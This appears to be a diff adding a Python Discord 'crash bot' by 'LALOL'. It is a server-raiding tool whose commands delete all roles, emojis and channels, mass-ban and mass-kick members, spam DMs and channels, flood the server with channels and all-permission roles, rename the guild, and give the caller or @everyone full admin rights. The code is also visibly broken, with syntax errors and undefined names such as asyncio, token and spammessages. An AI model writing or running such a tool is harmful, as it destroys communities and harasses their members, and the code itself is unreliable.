@@ -1,0 +1,169 @@
+print("Loading...")
+import os
+os.system('title Crash bot By LALOL' if os.name == 'nt' else 'clear')
+import discord
+from discord.ext import commands
+from colorama import init, Fore; init()
+
+with open('guildavatar', 'rb') as f:
+	icon = f.read()
+
+clear=lambda: os.system('cls && title Crash bot By LALOL' if os.name == 'nt' else 'clear')
+bot = commands.Bot(case_insensitive=True, intents=discord.Intents.all()), command_prefix="botprefix")
+
+async def delete(obj):
+	try:
+		await obj.delete()
+		print(Fore.WHITE + f"[LOG] {obj.name} Deleted")
+	except: pass
+@bot.event
+async def on_command_error(ctx, error):
+	print(Fore.RED + "[ERROR] "+ ctx.author + ": " + error)
+	try: await ctx.message.delete()
+	except: pass
+	if isinstance(error, commands.CommandOnCooldown):
+		retry_after = round(error.retry_after)
+		await ctx.author.send(f"**:warning: Подождите {retry_after} секунд перед использованием данной команды!**")
+@bot.event
+async def on_ready():
+	clear()
+	print(Fore.RED + f"Account: {Fore.YELLOW}{bot.user}\n{Fore.RED}id: {Fore.YELLOW}{bot.user.id}\n{Fore.RED}Prefix: {Fore.YELLOW}botprefix\n\n{Fore.GREEN}")
+#Nuke
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def deleteroles(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	for role in ctx.guild.roles:
+		asyncio.create_task(delete(role))
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def deleteemojis(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	for emoji in ctx.guild.emojis:
+		asyncio.create_task(delete(emoji))
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def deletechannels(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	for channel in ctx.guild.channels:
+		asyncio.create_task(delete(channel))
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def nuke(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	asyncio.create_task(deleteroles(ctx))
+	asyncio.create_task(deleteemojis(ctx))
+	asyncio.create_task(deletechannels(ctx))
+#spamobj
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def channels(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	while True:
+		try: await ctx.guild.create_text_channel(name="channelname")
+		except: break
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def roles(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	while True:
+		try: await ctx.guild.create_role(name=rolename, colour=discord.Colour(0xFF0000), permissions=discord.Permissions.all())
+		except: break
+#banall
+async def ban(member):
+	try: member.ban(reason="banreason")
+	except: pass
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def banall(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	for member in list(ctx.guild.members):
+		if member.id != ctx.author.id:
+			asyncio.create_task(ban(member))
+		else:
+			pass
+async def kick(member):
+	try: member.kick(reason="banreason")
+	except: pass
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def kickall(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	for member in list(ctx.guild.members):
+		if member.id != ctx.author.id:
+			asyncio.create_task(kick(member))
+		else:
+			pass
+#spam
+async def dm(member):
+	try: await member.send("spammessage")
+	except: pass
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def dmall(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	for member in list(ctx.guild.members):
+		asyncio.create_task(dm(member))
+async def spam1(channel):
+	embed=discord.Embed(title="Crashed By LALOL", description="https://www.youtube.com/channel/UCrPxV_35vSAQ_kvtrO-zVTA", color=0xff0000)
+	for aboba in range(spammessages):
+		try: await channel.send(content="spammessage")
+		except: break
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def spam(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	for channel in ctx.guild.text_channels:
+		asyncio.create_task(spam1(channel))
+#guild
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def rename(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	await ctx.guild.edit(name="guildname", icon = icon)
+@bot.event
+async def on_guild_channel_create(channel):
+	if channel.name == "channelname":
+		for aboba in range(spammessages):
+			try: await channel.send(content="spammessage"
+			except: break
+	else:
+		pass
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def admin(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	amogus = ''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=16))
+	await ctx.guild.create_role(name=amogus, permissions=discord.Permissions.all())
+	role = discord.utils.get(ctx.guild.roles, name=amogus)
+	await ctx.author.add_roles(role)
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def adminall(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	role = discord.utils.get(ctx.guild.roles, name="@everyone")
+	await role.edit(permissions=discord.Permissions.all())
+@bot.command()
+@commands.cooldown(1, 300, commands.BucketType.user)
+async def crash(ctx):
+	try: await ctx.message.delete()
+	except: pass
+	asyncio.create_task(nuke(ctx))
+	asyncio.create_task(channels(ctx))
+	asyncio.create_task(roles(ctx))
+	asyncio.create_task(dmall(ctx))
+	asyncio.create_task(rename(ctx))
+bot.run(token)
